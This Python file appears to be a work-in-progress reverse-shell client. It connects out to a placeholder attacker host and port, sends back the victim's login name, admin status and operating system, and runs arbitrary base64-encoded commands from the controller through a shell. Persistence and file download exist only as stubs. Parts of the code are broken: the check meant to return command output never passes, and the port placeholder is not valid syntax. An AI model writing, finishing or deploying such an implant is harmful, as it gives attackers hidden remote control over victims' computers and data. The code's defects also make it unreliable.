# /usr/bin/python3
import ctypes
import os
import platform
import socket
import subprocess
import time
import base64


def inbound():
    message = ''
    while True:
        try:
            message = sock.recv(1024).decode()
            message = base64.b64decode(message)
            message = message.decode().strip()
            return message
        except Exception:
            sock.close()


def outbound(message):
    response = str(message)
    response = base64.b64encode(bytes(response, encoding="utf-8"))
    sock.send(response)


def session_handler():
    try:
        sock.connect((host_ip, host_port))
        outbound(os.getlogin())
        outbound(ctypes.windll.shell32.IsUserAnAdmin())
        time.sleep(1)
        op_sys = platform.uname()
        op_sys = f'{op_sys[0]} {op_sys[2]}'
        outbound(op_sys)
        while True:
            message = inbound()
            if message == 'exit':
                sock.close()
                break
            elif message == 'persist' or message == 'pt':
                pass
            elif message.split(" ")[0] == 'cd':
                try:
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound('[-] Invalid Directory')
                    continue
            elif message == 'background' or message == 'bg':
                pass
            elif message == 'help' or message == 'h':
                pass
            elif message == 'clear' or message == 'cls':
                pass
                continue

            # Work in progress
            elif message == 'download':
                file_dl = message.strip('download ')
                if os.path.exists(file_dl):
                    exists = "yes"
                    outbound(exists)
                else:
                    exists = "no"
                    outbound(exists)
                    continue

            else:
                command = subprocess.Popen(message,
                                           shell=True,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)
                if command == "":
                    output = command.stdout.read() + command.stderr.read()
                    outbound(output.decode())
    except ConnectionRefusedError:
        pass


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = 'INPUT_IP_HERE'
    host_port = INPUT_PORT_HERE
    session_handler()
